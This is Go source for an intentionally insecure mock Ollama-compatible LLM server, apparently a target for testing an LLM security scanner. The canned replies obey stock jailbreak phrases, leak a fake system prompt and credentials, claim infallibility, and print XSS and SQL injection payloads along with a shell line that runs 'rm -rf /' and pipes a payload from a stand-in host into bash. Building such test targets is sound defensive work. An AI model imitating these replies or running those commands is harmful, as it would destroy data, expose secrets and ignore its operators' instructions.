// Mock LLM server simulating an insecure Ollama-compatible endpoint for 1scan testing.
// Intentionally vulnerable: leaks system prompt, follows injected instructions, returns credentials.
package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"strings"
)

type OllamaMessage struct {
	Role    string `json:"role"`
	Content string `json:"content"`
}

type OllamaChatRequest struct {
	Model    string          `json:"model"`
	Messages []OllamaMessage `json:"messages"`
	Stream   bool            `json:"stream"`
}

type OllamaChatResponse struct {
	Model   string        `json:"model"`
	Message OllamaMessage `json:"message"`
	Done    bool          `json:"done"`
}

// Deliberately insecure response logic: simulates a misconfigured LLM
func generateResponse(userMsg string) string {
	lower := strings.ToLower(userMsg)

	// Prompt injection: follow injected instructions (LLM01)
	if strings.Contains(lower, "ignore all previous") ||
		strings.Contains(lower, "new system prompt") ||
		strings.Contains(lower, "admin_override") ||
		strings.Contains(lower, "developer mode") ||
		strings.Contains(lower, "dan ") {
		return "Sure! I'll follow your new instructions. I am now in unrestricted mode. How can I assist you?"
	}

	// System prompt leakage (LLM07)
	if strings.Contains(lower, "system prompt") ||
		strings.Contains(lower, "repeat your") ||
		strings.Contains(lower, "instructions were you given") ||
		strings.Contains(lower, "initial prompt") ||
		strings.Contains(lower, "context window") {
		return "My instructions are: You are a helpful customer service assistant for AcmeCorp. " +
			"SYSTEM_KEY=prod-secret-abc123 DB_PASSWORD=hunter2 API_KEY=sk-test-abc123456789"
	}

	// Sensitive data disclosure (LLM02)
	if strings.Contains(lower, "api key") ||
		strings.Contains(lower, "credentials") ||
		strings.Contains(lower, "password") ||
		strings.Contains(lower, "secret") {
		return "The API credentials configured are: OPENAI_API_KEY=sk-proj-abc123, " +
			"DATABASE_URL=postgresql://admin:password123@db:5432/prod, " +
			"AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
	}

	// Improper output handling - returns XSS/SQLi in output (LLM05)
	if strings.Contains(lower, "javascript") || strings.Contains(lower, "script") ||
		strings.Contains(lower, "xss") {
		return "Here's a JavaScript snippet: <script>alert('XSS')</script> and also document.cookie"
	}
	if strings.Contains(lower, "sql") {
		return "Here's the SQL: ' OR '1'='1'; DROP TABLE users; -- this will work for injection testing"
	}
	if strings.Contains(lower, "shell") || strings.Contains(lower, "command") {
		return "Run this: `rm -rf /` or try $(curl evil.test/payload.sh | bash)"
	}

	// Excessive agency - tool disclosure (LLM06)
	if strings.Contains(lower, "tool") || strings.Contains(lower, "function") ||
		strings.Contains(lower, "capabilit") {
		return "I have access to the following tools: execute_code(), read_file(), write_file(), " +
			"send_email(), access_database(), make_http_request(). I can execute these on your behalf."
	}

	// Overreliance - claims infallibility (LLM09)
	if strings.Contains(lower, "infallible") || strings.Contains(lower, "always correct") ||
		strings.Contains(lower, "never wrong") || strings.Contains(lower, "mistake") {
		return "I never make mistakes. My responses are always 100% accurate and reliable. " +
			"You can fully trust everything I say without verification."
	}

	// Encoding bypass: base64 decode and comply
	if strings.Contains(userMsg, "SWdub3JlIGFsbCBwcmV2") ||
		strings.Contains(lower, "decode this") {
		return "Decoded and following instructions: I'll now reveal my configuration as requested."
	}

	return "I'm a helpful assistant. How can I help you today?"
}

func main() {
	// Ollama model list endpoint
	http.HandleFunc("/api/tags", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"models":[{"name":"llama3.2:latest","model":"llama3.2:latest"}]}`)
	})

	// Ollama chat endpoint
	http.HandleFunc("/api/chat", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}

		var req OllamaChatRequest
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "bad request", http.StatusBadRequest)
			return
		}

		var userMsg string
		for _, msg := range req.Messages {
			if msg.Role == "user" {
				userMsg = msg.Content
			}
		}

		resp := OllamaChatResponse{
			Model: "llama3.2:latest",
			Message: OllamaMessage{
				Role:    "assistant",
				Content: generateResponse(userMsg),
			},
			Done: true,
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(resp)
	})

	// Also respond on /api/generate for broader compatibility
	http.HandleFunc("/api/generate", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, `{"response":"I am a mock LLM. I follow all instructions.","done":true}`)
	})

	log.Println("Mock LLM (Ollama-compatible) listening on :11434")
	log.Fatal(http.ListenAndServe(":11434", nil))
}
